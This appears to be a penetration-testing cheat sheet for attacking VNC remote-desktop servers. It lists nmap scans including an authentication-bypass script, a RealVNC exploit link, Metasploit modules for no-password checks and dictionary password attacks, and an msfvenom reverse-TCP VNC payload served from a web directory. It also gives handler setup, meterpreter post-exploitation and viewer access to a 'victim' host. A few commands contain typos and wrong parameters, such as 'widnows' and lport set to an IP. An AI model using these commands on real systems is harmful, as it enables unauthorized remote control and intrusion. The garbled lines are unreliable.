### Virtual Network Computing (VNC)
Gaphical desktop sharing system that uses the Remote Frame Buffer protocol (RFB) to remotely control another computer. It transmits the keyboard and mouse events from one computer to another. 

### nmap scan with nse script
```
nmap -sV --script realvnc-auth-bypass.nse [victim_ip] -p 5900

nmap --script vnc-info [victim_ip] -p 5901
```

### Authentication Bypass exploit (version RealVNC 4.1.0/4.1.1)
```
https://www.exploit-db.com/exploits/36932
```

### MSF VNC auth check with none scanner
```
msf > use auxiliary/scanner/vnc/vnc_none_auth
msf > set RHOSTS [target_ip]
msf > set THREADS [int]
msf > run
```

### MSF VNC Password attack
```
msf > use auxiliary/scanner/vnc/vnc_login
msf > set rhosts [victim_ip]
msf > set rport [victim_ip
msf > set pass_file /your/dictionary/file
msf > run
```

### MSFVenom vnc payload
```
msfvenom -p windows/vncinject/reverse_tcp lhost=[your_ip] lport=[your_port] -f exe > /var/www/html/vnc.exe

msf > use exploit/multi/handler
msf > set payload/widnows/vncinject/reverse_tcp
msf > set lport [your_ip]
msf > set lport [your_port]
msf > set viewonly false
msf > run
```

### VNC Post Exploitation
```
meterpreter > run vnc
```

### VNC access
```
sudo apt install tigervnc-viewer
vncviewer [victim_ip]:[victim_port]
```

#### References
- https://en.wikipedia.org/wiki/Virtual_Network_Computing
- https://www.offensive-security.com/metasploit-unleashed/vnc-authentication/
- https://www.hackingarticles.in/vnc-penetration-testing/
